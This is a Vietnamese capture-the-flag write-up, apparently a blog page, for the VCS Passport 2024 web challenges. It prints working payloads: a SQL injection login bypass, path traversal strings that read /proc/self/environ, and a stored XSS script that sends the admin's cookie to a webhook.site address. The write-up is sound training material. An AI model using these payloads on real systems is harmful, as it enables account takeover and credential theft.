@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Source các challenge: https:&#x2F;&#x2F;github.com&#x2F;DuongHaoNika&#x2F;VCS_Passport_2024_Web Bài Web01-Flag1Khi bấm vào link, mình thấy giao diện như sau:  Sau đó đọc source code thấy route &#x2F;freeflag:   Sau đó th">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup VCS Passpost 2024 [WEB]">
+<meta property="og:url" content="https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/index.html">
+<meta property="og:site_name" content="haonika&#39;s blog">
+<meta property="og:description" content="Source các challenge: https:&#x2F;&#x2F;github.com&#x2F;DuongHaoNika&#x2F;VCS_Passport_2024_Web Bài Web01-Flag1Khi bấm vào link, mình thấy giao diện như sau:  Sau đó đọc source code thấy route &#x2F;freeflag:   Sau đó th">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/user-attachments/assets/6ff658e5-6eac-4c76-855e-a0f068b128aa">
+<meta property="og:image" content="https://github.com/user-attachments/assets/b1c152e8-ca35-4e35-af80-ddd8404476d7">
+<meta property="og:image" content="https://github.com/user-attachments/assets/21719077-75c5-4f36-aa35-b99374801a54">
+<meta property="og:image" content="https://github.com/user-attachments/assets/54be6e44-c4b9-4334-b265-d18b783cbabd">
+<meta property="og:image" content="https://github.com/user-attachments/assets/ddbb660a-9456-4f87-b68e-e2ca367d1aa0">
+<meta property="og:image" content="https://github.com/user-attachments/assets/818e8fed-f673-4ef0-abf5-32345153c4e0">
+<meta property="og:image" content="https://github.com/user-attachments/assets/bee9d8e7-cfa2-4f65-83a0-729392068f35">
+<meta property="og:image" content="https://github.com/user-attachments/assets/81ca0b0b-bd16-4541-afec-accf6709a5fd">
+<meta property="og:image" content="https://github.com/user-attachments/assets/a2ae19fc-82ce-494e-b830-1d75aecc975f">
+<meta property="og:image" content="https://github.com/user-attachments/assets/8cb57872-1fec-486e-a0d1-83f3be96e85c">
+<meta property="og:image" content="https://github.com/user-attachments/assets/ef41237b-cb00-4c8c-afc1-ff9bd11555ba">
+<meta property="og:image" content="https://github.com/user-attachments/assets/46e53fbb-de7c-4790-8ba2-009809fe2cab">
+<meta property="og:image" content="https://github.com/user-attachments/assets/8e545b71-1856-46f5-a82a-a402e49906b6">
+<meta property="og:image" content="https://github.com/user-attachments/assets/203c4e08-1a96-4575-8939-eca0baa1feff">
+<meta property="og:image" content="https://github.com/user-attachments/assets/38bc81eb-70b0-439d-96e0-33f95c8f643d">
+<meta property="og:image" content="https://github.com/user-attachments/assets/45623108-09a2-4dd9-a0ec-c348ae27e682">
+<meta property="og:image" content="https://github.com/user-attachments/assets/e564fe87-8482-48f5-a650-c484860ad4c4">
+<meta property="og:image" content="https://github.com/user-attachments/assets/3227a8a9-8a2e-4d30-9dca-61518c18e4a3">
+<meta property="og:image" content="https://github.com/user-attachments/assets/222453fd-2a1f-44ab-8f07-87264dafe107">
+<meta property="og:image" content="https://github.com/user-attachments/assets/7f9c036e-8a96-466f-a311-be5a62aeb26d">
+<meta property="og:image" content="https://github.com/user-attachments/assets/c37ebc67-3173-4d4d-b015-b9456bc0aaf5">
+<meta property="og:image" content="https://github.com/user-attachments/assets/32689981-3073-4d73-86ce-894a6fa7a19f">
+<meta property="og:image" content="https://github.com/user-attachments/assets/7ed53f13-bee9-4c5f-a6cd-5dfa0a469572">
+<meta property="og:image" content="https://github.com/user-attachments/assets/c438988e-213f-466a-8fad-8e184f7262ee">
+<meta property="og:image" content="https://github.com/user-attachments/assets/0b141994-a8e7-4603-9db5-b3e7b5da7581">
+<meta property="og:image" content="https://github.com/user-attachments/assets/0bc89596-9dae-487e-8117-3093ac458c2d">
+<meta property="og:image" content="https://github.com/user-attachments/assets/2f4beadc-27a7-4a6e-9aa8-f6f3bd68e262">
+<meta property="og:image" content="https://github.com/user-attachments/assets/1a474131-6ce2-4fb1-aa96-a42e1acc66ed">
+<meta property="og:image" content="https://github.com/user-attachments/assets/f02f255e-d72a-4c14-846f-fab4d0193d3f">
+<meta property="article:published_time" content="2025-01-15T17:40:25.000Z">
+<meta property="article:modified_time" content="2025-09-18T01:50:21.813Z">
+<meta property="article:author" content="Duong Quang Hao">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/user-attachments/assets/6ff658e5-6eac-4c76-855e-a0f068b128aa">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Writeup VCS Passpost 2024 [WEB]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/09/15/android-pentest/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/05/cyradar-wu-2024/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&text=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&is_video=false&description=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeup VCS Passpost 2024 [WEB]&body=Check out this article: https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&name=Writeup VCS Passpost 2024 [WEB]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&t=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web01-Flag1"><span class="toc-number">1.</span> <span class="toc-text">Bài Web01-Flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web01-Flag2"><span class="toc-number">2.</span> <span class="toc-text">Bài Web01-Flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web01-Flag3"><span class="toc-number">3.</span> <span class="toc-text">Bài Web01-Flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web04"><span class="toc-number">4.</span> <span class="toc-text">Bài Web04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web06"><span class="toc-number">5.</span> <span class="toc-text">Bài Web06</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Writeup VCS Passpost 2024 [WEB]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Duong Quang Hao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-15T17:40:25.000Z" class="dt-published" itemprop="datePublished">2025-01-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Source các challenge: <a target="_blank" rel="noopener" href="https://github.com/DuongHaoNika/VCS_Passport_2024_Web">https://github.com/DuongHaoNika/VCS_Passport_2024_Web</a></p>
+<h2 id="Bai-Web01-Flag1"><a href="#Bai-Web01-Flag1" class="headerlink" title="Bài Web01-Flag1"></a>Bài Web01-Flag1</h2><p>Khi bấm vào link, mình thấy giao diện như sau:</p>
+<p><img src="https://github.com/user-attachments/assets/6ff658e5-6eac-4c76-855e-a0f068b128aa" alt="image"></p>
+<p>Sau đó đọc source code thấy route &#x2F;freeflag:</p>
+<p><img src="https://github.com/user-attachments/assets/b1c152e8-ca35-4e35-af80-ddd8404476d7" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/21719077-75c5-4f36-aa35-b99374801a54" alt="image"></p>
+<p>Sau đó thấy server trả về session như hình</p>
+<p><img src="https://github.com/user-attachments/assets/54be6e44-c4b9-4334-b265-d18b783cbabd" alt="image"></p>
+<p>&#x3D;&gt; Có thể là jwt. Vào trang jwt.io check:</p>
+<p><img src="https://github.com/user-attachments/assets/ddbb660a-9456-4f87-b68e-e2ca367d1aa0" alt="image"></p>
+<p>&#x3D;&gt; Flag: <code>VCS&#123;Web01-Flag1-680c37cc-6147-4d08-8c11 29c91b2a50bf&#125;</code></p>
+<h2 id="Bai-Web01-Flag2"><a href="#Bai-Web01-Flag2" class="headerlink" title="Bài Web01-Flag2"></a>Bài Web01-Flag2</h2><p>Sau khi đọc source code, thấy chỉ lấy được Flag02 trong trường hợp login với admin</p>
+<p><img src="https://github.com/user-attachments/assets/818e8fed-f673-4ef0-abf5-32345153c4e0" alt="image"></p>
+<p>Trước tiên thì tìm hiểu xem cơ chế mà server xử lý login như nào</p>
+<p><img src="https://github.com/user-attachments/assets/bee9d8e7-cfa2-4f65-83a0-729392068f35" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/81ca0b0b-bd16-4541-afec-accf6709a5fd" alt="image"></p>
+<p>Hàm <code>execute</code> đã trực tiếp nối input của người dùng (username) vào trực tiếp câu lệnh SQL &#x3D;&gt; SQLInjection<br>Server kiểm tra trước xem có tồn tại username không, nếu có thì lấy password đã<br>được hash md5 (lưu trữ) trong database, và lấy password người dùng nhập, hash md5<br>password đó &#x3D;&gt; Kiểm tra xem 2 hash trùng nhau không &#x3D;&gt; Trùng thì đăng nhập thành<br>công.</p>
+<p>Hoàn toàn có thể tận dụng lỗi SQL Injection trên, union select 1 tài khoản admin<br>và 1 mật khẩu đã được mã hóa md5</p>
+<p><img src="https://github.com/user-attachments/assets/a2ae19fc-82ce-494e-b830-1d75aecc975f" alt="image"></p>
+<p>Đọc source &#x3D;&gt; Sử dụng SQLite3</p>
+<p>Sau đó vào Burp Suite, chỉnh giá trị username như sau:</p>
+<p><code>abc&quot;) UNION SELECT &#39;admin&#39;, &#39;202cb962ac59075b964b07152d234b70&#39;-</code></p>
+<p>Password cung cấp: <code>123</code></p>
+<p>Ở đây để phần đầu username là abc, để server không tìm thấy user có username là<br>abc thì user phía sau được lấy &#x3D;&gt; Fake được user admin</p>
+<p><img src="https://github.com/user-attachments/assets/8cb57872-1fec-486e-a0d1-83f3be96e85c" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/ef41237b-cb00-4c8c-afc1-ff9bd11555ba" alt="image"></p>
+<h2 id="Bai-Web01-Flag3"><a href="#Bai-Web01-Flag3" class="headerlink" title="Bài Web01-Flag3"></a>Bài Web01-Flag3</h2><p>Đọc file <code>start.sh</code>:</p>
+<p><img src="https://github.com/user-attachments/assets/46e53fbb-de7c-4790-8ba2-009809fe2cab" alt="image"></p>
+<p>Thấy <code>$FLAG3</code> chưa unset &#x3D;&gt; vẫn nằm trên environ của tiến trình. </p>
+<p>Khi đọc src thì mình nhận ra field <code>title</code> không hề được validate:</p>
+<p><img src="https://github.com/user-attachments/assets/8e545b71-1856-46f5-a82a-a402e49906b6" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/203c4e08-1a96-4575-8939-eca0baa1feff" alt="image"></p>
+<p>Ý tưởng là mình sẽ inject vào field <code>title</code> để thực hiện Path Traversal, đọc file <code>/proc/self/environ</code> hoặc <code>/proc/1/environ</code></p>
+<p>Đầu tiên mình tạo request với CURL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl.exe -X POST http://localhost:9001/upload-meme -F &quot;meme=@dockerfile&quot; -F &quot;title=title&quot; -x 127.0.0.1:8080 -v</span><br></pre></td></tr></table></figure>
+
+<p>Qua Burp Suite</p>
+<p><img src="https://github.com/user-attachments/assets/38bc81eb-70b0-439d-96e0-33f95c8f643d" alt="image"></p>
+<p><img src="https://github.com/user-attachments/assets/45623108-09a2-4dd9-a0ec-c348ae27e682" alt="image"></p>
+<p>Sửa <code>title</code> &#x3D;&gt; <code>aaaaaaaa&quot;, &quot;../../../../../../../proc/self/environ&quot;) --</code></p>
+<p><img src="https://github.com/user-attachments/assets/e564fe87-8482-48f5-a650-c484860ad4c4" alt="image"></p>
+<h2 id="Bai-Web04"><a href="#Bai-Web04" class="headerlink" title="Bài Web04"></a>Bài Web04</h2><p><img src="https://github.com/user-attachments/assets/3227a8a9-8a2e-4d30-9dca-61518c18e4a3" alt="image"></p>
+<p>Đây là code python, trong index có hàm render_template() không bị SSTI (render_template_string thì bị) </p>
+<p>Mình để ý đến <code>/feedback</code></p>
+<p><img src="https://github.com/user-attachments/assets/222453fd-2a1f-44ab-8f07-87264dafe107" alt="image"></p>
+<p><code>subject</code> được đưa vào nối chuỗi &#x3D;&gt; Có thể bị Path Traversal</p>
+<p>Sau khi xem và tìm hiểu thì hàm unidecode() có thể chuyển <code>\</code>, <code>\\</code> về <code>/</code> &#x3D;&gt; bypass được ‘&#x2F;‘</p>
+<p>Xem docker và check được user có thể ghi vào folder <code>errors</code></p>
+<p><img src="https://github.com/user-attachments/assets/7f9c036e-8a96-466f-a311-be5a62aeb26d" alt="image"></p>
+<p>Ý tưởng là mình sẽ Path Traversal qua field <code>subject</code> và thực hiện lệnh gì đó qua field <code>content</code></p>
+<p><img src="https://github.com/user-attachments/assets/c37ebc67-3173-4d4d-b015-b9456bc0aaf5" alt="image"></p>
+<p>Lấy được flag trong config (<code>app.config[&#39;FLAG&#39;] = os.environ[&#39;FLAG&#39;]</code>)</p>
+<p><img src="https://github.com/user-attachments/assets/32689981-3073-4d73-86ce-894a6fa7a19f" alt="image"></p>
+<h2 id="Bai-Web06"><a href="#Bai-Web06" class="headerlink" title="Bài Web06"></a>Bài Web06</h2><p><img src="https://github.com/user-attachments/assets/7ed53f13-bee9-4c5f-a6cd-5dfa0a469572" alt="image"></p>
+<p>Khi đọc source mình để ý 2 hàm dưới</p>
+<p><img src="https://github.com/user-attachments/assets/c438988e-213f-466a-8fad-8e184f7262ee" alt="image"></p>
+<p>Check tiếp hàm register</p>
+<p><img src="https://github.com/user-attachments/assets/0b141994-a8e7-4603-9db5-b3e7b5da7581" alt="image"></p>
+<p> Nhận thấy <code>email</code> và <code>bio</code> đã bị filter XSS. Còn username được lấy từ<br> <code>session[“username”]</code>. Mà <code>username</code> trong hàm register lấy trực tiếp từ người dùng<br> &#x3D;&gt; <code>username</code> là <strong>untrusted data</strong></p>
+<p> Hàm report profile &#x3D;&gt; khả năng được gửi lên để admin xem<br> &#x3D;&gt; sẽ ra sao nếu report 1 nick có username với payload xss để cướp cookie admin<br> khi xem<br>Đầu tiên tạo 1 user có username:<br> <script>fetch(<code>https://webhook.site/d15deb00-b0fb-43ad-a288 480ba00c2c37?cookie=$&#123;document.cookie&#125;</code>)</script></p>
+<p><img src="https://github.com/user-attachments/assets/0bc89596-9dae-487e-8117-3093ac458c2d" alt="image"></p>
+<p> Sau đó tạo user khác, mục đích để lấy nick này report nick trên</p>
+<p><img src="https://github.com/user-attachments/assets/2f4beadc-27a7-4a6e-9aa8-f6f3bd68e262" alt="image"></p>
+<p>Ví dụ: <a target="_blank" rel="noopener" href="http://localhost:9006/profile/3ab3a9de-3571-48a4-bb01-257486e69f3a">http://localhost:9006/profile/3ab3a9de-3571-48a4-bb01-257486e69f3a</a></p>
+<p><img src="https://github.com/user-attachments/assets/1a474131-6ce2-4fb1-aa96-a42e1acc66ed" alt="image"></p>
+<p>Check webhook</p>
+<p><img src="https://github.com/user-attachments/assets/f02f255e-d72a-4c14-846f-fab4d0193d3f" alt="image"></p>
+<p>Flag: <code>VCS&#123;web06-2f29cec6-b8ea-4126-a2cd-a213bb332150&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a href="/story/">Story</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web01-Flag1"><span class="toc-number">1.</span> <span class="toc-text">Bài Web01-Flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web01-Flag2"><span class="toc-number">2.</span> <span class="toc-text">Bài Web01-Flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web01-Flag3"><span class="toc-number">3.</span> <span class="toc-text">Bài Web01-Flag3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web04"><span class="toc-number">4.</span> <span class="toc-text">Bài Web04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bai-Web06"><span class="toc-number">5.</span> <span class="toc-text">Bài Web06</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&text=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&is_video=false&description=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeup VCS Passpost 2024 [WEB]&body=Check out this article: https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&title=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&name=Writeup VCS Passpost 2024 [WEB]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2025/01/16/vcs-wu-2024/&t=Writeup VCS Passpost 2024 [WEB]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025
+    Duong Quang Hao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
